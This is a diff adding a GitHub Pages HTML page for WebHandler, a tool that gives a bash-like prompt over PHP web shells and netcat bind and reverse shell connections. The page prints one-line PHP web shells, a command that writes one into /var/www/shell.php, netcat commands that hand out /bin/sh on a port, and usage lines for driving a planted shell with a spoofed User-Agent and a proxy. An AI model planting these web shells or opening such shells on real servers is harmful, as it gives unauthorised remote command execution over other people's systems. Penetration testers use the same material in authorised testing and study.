@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset='utf-8' />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+    <meta name="description" content="Webhandler : Bash simulator to control a server using PHP system functions." />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
+
+    <title>Webhandler</title>
+  </head>
+
+  <body>
+
+    <!-- HEADER -->
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          <a id="forkme_banner" href="https://github.com/lnxg33k/webhandler">View on GitHub</a>
+
+          <h1 id="project_title">Webhandler</h1>
+          <h2 id="project_tagline">Bash simulator to control a server using PHP system functions.</h2>
+
+            <section id="downloads">
+              <a class="zip_download_link" href="https://github.com/lnxg33k/webhandler/zipball/master">Download this project as a .zip file</a>
+              <a class="tar_download_link" href="https://github.com/lnxg33k/webhandler/tarball/master">Download this project as a tar.gz file</a>
+            </section>
+        </header>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <h1>WebHandler</h1>
+
+<hr><p>A handler for PHP system functions &amp; also an alternative 'netcat' handler
+<img src="http://s12.postimage.org/t5ujo2om5/Untitled_1.png" alt="My image"></p>
+
+<h3>Info</h3>
+
+<hr><p>WebHandler tries to simulate a 'Linux bash prompt' to handle and process:</p>
+
+<pre><code>- PHP program execution functions _(e.g. `system`, `passthru`, `exec`, etc)_
+- Bind shell connections _(e.g. `nc &lt;ip&gt; &lt;port&gt;`)_
+- Reserve shell connections _(e.g. `nc -lvvp 1234`)_
+</code></pre>
+
+<p>Another feature is to spoof the "User-Agent" field in the HTTP header. (<code>--random-angent</code>).</p>
+
+<p>It also supports HTTP proxies (<code>--proxy http://&lt;ip&gt;:&lt;port&gt;</code>)</p>
+
+<ul>
+<li>
+<p>WebHandler works for <strong>POST</strong> and <strong>GET</strong> requests:</p>
+
+<ul>
+<li><code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+<li><code>&lt;?php passthru($_REQUEST['cmd']); ?&gt;</code></li>
+<li><code>&lt;?php echo exec($_POST['cmd']); ?&gt;</code></li>
+</ul>
+</li>
+<li>
+<p>WebHandler is a replacement for netcat connections.</p>
+
+<p>A example bind connection (_e.g. <code>nc -lvvp 1234 -e /bin/sh</code>_)</p>
+
+<p>Normally the user would do:</p>
+
+<ul>
+<li><code>netcat -l -p 1234</code></li>
+<li><code>nc -lvvp 1234</code></li>
+</ul>
+<p>A example reverse connection (_e.g. <code>nc 127.0.0.1 4321 -e /bin/sh</code>_)</p>
+
+<p>Normally the user would do:</p>
+
+<ul>
+<li><code>netcat -l -p 4321</code></li>
+<li><code>nc -lvvp 4321</code></li>
+</ul>
+</li>
+</ul><h3>Usage</h3>
+
+<hr><ul>
+<li>
+<p>--Example file:</p>
+
+<ul>
+<li><code>echo '&lt;?php system($_GET['cmd']); ?&gt;' &gt; /var/www/shell.php</code></li>
+</ul>
+</li>
+<li>
+<p>--url is a required argument when sending either GET or POST requests <em>(e.g. a bind 'web based PHP' connection)</em>:</p>
+
+<ul>
+<li><code>python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=</code></li>
+<li><code>python webhandler.py --url http://www.mywebsite.com/shell.php --method POST --parameter cmd</code></li>
+<li><code>python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --random-agent --turbo</code></li>
+<li><code>python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080</code></li>
+</ul>
+</li>
+<li>
+<p>--listen is a required argument when working waiting connection <em>(e.g. a reverse 'raw' connection)</em>:</p>
+
+<ul>
+<li><code>python webhandler.py --listen 1234</code></li>
+</ul>
+</li>
+</ul><h3>Dependencies</h3>
+
+<hr><p>If your <a href="http://www.python.org/download/">Python</a>'s version &lt; 2.7.x, then <a href="http://docs.python.org/library/argparse.html">argparse</a> <strong>is required</strong>
+To install it run: <code>sudo (apt-get|yum) install python-setuptools &amp;&amp; sudo easy_install argparse</code> <strong>OR</strong> <code>sudo pip --install argparse</code>.</p>
+
+<p><a href="http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html">readline</a> <strong>is optional</strong>.
+This module it used to provide elaborate line editing and history features</p>
+
+<p><a href="http://git-scm.com">git</a> <strong>is optional</strong>.
+This allows for the project to be kept up-to-date</p>
+
+<h3>Links</h3>
+
+<hr><p><a href="https://github.com/lnxg33k/webhandler/wiki">Wiki</a></p>
+
+<p><a href="https://github.com/lnxg33k/webhandler/issues">Known Bugs</a></p>
+      </section>
+    </div>
+
+    <!-- FOOTER  -->
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        <p class="copyright">Webhandler maintained by <a href="https://github.com/lnxg33k">lnxg33k</a></p>
+        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
+      </footer>
+    </div>
+
+    
+
+  </body>
+</html>
